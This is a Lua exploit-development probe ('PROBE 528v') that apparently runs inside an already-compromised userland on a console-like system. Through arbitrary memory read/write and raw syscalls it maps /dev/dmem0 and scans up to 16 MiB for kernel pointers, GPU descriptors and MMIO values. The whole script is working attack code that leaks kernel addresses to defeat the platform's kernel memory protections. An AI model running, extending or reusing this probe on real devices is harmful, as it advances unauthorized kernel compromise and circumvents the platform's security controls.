-- CRASH_CLASS: LOW
-- PROBE 528v: Deep read of dmem0 offset 0 header
--
-- 528u found 0xFFFFFFFF2EC47FC0 at dmem0 offset +0x18.
-- If 0xFFFFFFFF is a valid kernel pointer prefix on 14.10 (not just
-- NaN-boxed Lua), this could be a kernel pointer in a GPU descriptor.
--
-- Read the first 4 pages (64 KB) of dmem0 to understand the structure.
-- Look for all values with hi32 >= 0xFFFF8000.
-- Also check: values like 0xFFFFFFFF that might be -1 sentinels vs pointers.

print("=== PROBE 528v: DMEM0 HEADER DEEP READ ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa_buf, uint64(0)) end)
end

local sc_477 = mk(477)
local sc_73 = mk(73)
local PAGE = 0x4000

local function open_dev(name)
    local devpath = memory.alloc(0x30)
    for i = 1, #name do wd(N(devpath) + i - 1, string.byte(name, i)) end
    wd(N(devpath) + #name, 0)
    local ok, rv = pcall(function()
        return native.fcall_with_rax(stub, 5, uint64(N(devpath)), uint64(2), uint64(0))
    end)
    return ok and N(rv) or -1
end

local dm_fd = open_dev("/dev/dmem0")
print("dmem0 fd=" .. dm_fd)
if dm_fd < 0 then return end

-- ============================================================
-- [A] Map first 4 pages (64 KB) at offset 0
-- ============================================================
print("")
print("[A] First 64KB of dmem0")
local map_size = 4 * PAGE
local ok_m, rv_m = pcall(function()
    return sc_477(uint64(0), uint64(map_size), uint64(1), uint64(1), uint64(dm_fd), uint64(0))
end)
if not ok_m or not rv_m then print("FAIL"); return end
local rh, rl = get_hi_lo(rv_m)
if rh < 0 then rh = rh + 0x100000000 end
if rh == 0xFFFFFFFF then print("FAIL -1"); return end

local va = N(rv_m)
print("  mapped at " .. fmt(rv_m))

-- Dump all qwords that have interesting values
local interesting = {}
for off = 0, map_size - 8, 8 do
    local v = rq(va + off)
    if v then
        local vh, vl = get_hi_lo(v)
        if vh < 0 then vh = vh + 0x100000000 end
        if vl < 0 then vl = vl + 0x100000000 end
        -- Skip zeros
        if vh ~= 0 or vl ~= 0 then
            table.insert(interesting, {off, vh, vl})
        end
    end
end

print("  non-zero qwords: " .. #interesting)
print("")
print("  Full dump of non-zero values:")
for i, e in ipairs(interesting) do
    if i > 100 then print("  ... (" .. #interesting .. " total)"); break end
    local tag = ""
    if e[2] == 0xFFFFFFFF then
        -- Could be -1 sentinel or kernel pointer
        -- On 14.10, if kernel base is lower than 13.60's 0x9E3F0000...
        -- 0xFFFFFFFF2EC47FC0 has lo32 = 0x2EC47FC0
        -- 0xFFFFFFFF00000000 would be just -4GB
        if e[3] > 0 and e[3] ~= 0xFFFFFFFF then
            tag = " <KPTR?>"
        else
            tag = " <sentinel>"
        end
    elseif e[2] >= 0xFFFF8000 and e[2] < 0xFFFFFFFF then
        tag = " <KPTR>"
    elseif e[2] >= 0x80000000 and e[2] < 0xFFFF0000 then
        tag = " <GPU_ADDR?>"
    elseif e[2] >= 0xC0000000 and e[2] < 0xD0000000 then
        tag = " <MMIO?>"
    end
    print(string.format("  [0x%04X] 0x%08X%08X%s", e[1], e[2], e[3], tag))
end

-- ============================================================
-- [B] Check if 0xFFFFFFFF values are stable across connections
-- ============================================================
print("")
print("[B] Stability check — reread key offsets")
-- Re-read the interesting offsets
local key_offsets = {0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30}
for _, off in ipairs(key_offsets) do
    local v = rq(va + off)
    print(string.format("  [0x%02X] = %s", off, fmt(v)))
end

-- ============================================================
-- [C] Look for kernel-like structures: consecutive pointers
-- ============================================================
print("")
print("[C] Consecutive pointer analysis")
local runs = {}
local cur_run = {}
for off = 0, map_size - 8, 8 do
    local v = rq(va + off)
    if v then
        local vh = get_hi_lo(v)
        if vh < 0 then vh = vh + 0x100000000 end
        if vh == 0xFFFFFFFF then
            table.insert(cur_run, {off, v})
        else
            if #cur_run >= 3 then
                table.insert(runs, cur_run)
            end
            cur_run = {}
        end
    end
end
if #cur_run >= 3 then table.insert(runs, cur_run) end

print("  runs of 3+ consecutive 0xFFFFFFFF_ values: " .. #runs)
for ri, run in ipairs(runs) do
    if ri > 5 then break end
    print(string.format("  run %d: %d entries at offset 0x%X-0x%X",
        ri, #run, run[1][1], run[#run][1]))
    for _, e in ipairs(run) do
        local vh, vl = get_hi_lo(e[2])
        if vh < 0 then vh = vh + 0x100000000 end
        if vl < 0 then vl = vl + 0x100000000 end
        print(string.format("    [0x%04X] 0x%08X%08X", e[1], vh, vl))
    end
end

-- ============================================================
-- [D] Scan first 16 MiB for pages starting with 0xFFFFFFFF_
-- ============================================================
print("")
print("[D] 0-16 MiB scan for 0xFFFFFFFF_ page starts")
pcall(function() sc_73(rv_m, uint64(map_size)) end)

local big_map_size = 0x1000000  -- 16 MiB
local ok_b, rv_b = pcall(function()
    return sc_477(uint64(0), uint64(big_map_size), uint64(1), uint64(1), uint64(dm_fd), uint64(0))
end)
if ok_b and rv_b then
    local bh, bl = get_hi_lo(rv_b)
    if bh < 0 then bh = bh + 0x100000000 end
    if bh ~= 0xFFFFFFFF then
        local big_va = N(rv_b)
        local ff_pages = 0
        for p = 0, big_map_size / PAGE - 1 do
            local v = rq(big_va + p * PAGE)
            if v then
                local vh = get_hi_lo(v)
                if vh < 0 then vh = vh + 0x100000000 end
                if vh == 0xFFFFFFFF then
                    ff_pages = ff_pages + 1
                    if ff_pages <= 10 then
                        local vl = get_hi_lo(v)
                        if type(vl) == "number" and vl < 0 then vl = vl + 0x100000000 end
                        local _, vl2 = get_hi_lo(v)
                        if vl2 < 0 then vl2 = vl2 + 0x100000000 end
                        print(string.format("  page %d (off 0x%X): %s", p, p*PAGE, fmt(v)))
                    end
                end
            end
        end
        print("  total 0xFFFFFFFF_ pages: " .. ff_pages .. " / " .. (big_map_size / PAGE))
        pcall(function() sc_73(rv_b, uint64(big_map_size)) end)
    end
else
    print("  16 MiB map failed")
end

pcall(function() native.fcall_with_rax(stub, 6, uint64(dm_fd)) end)
print("")
print("=== 528v DONE ===")
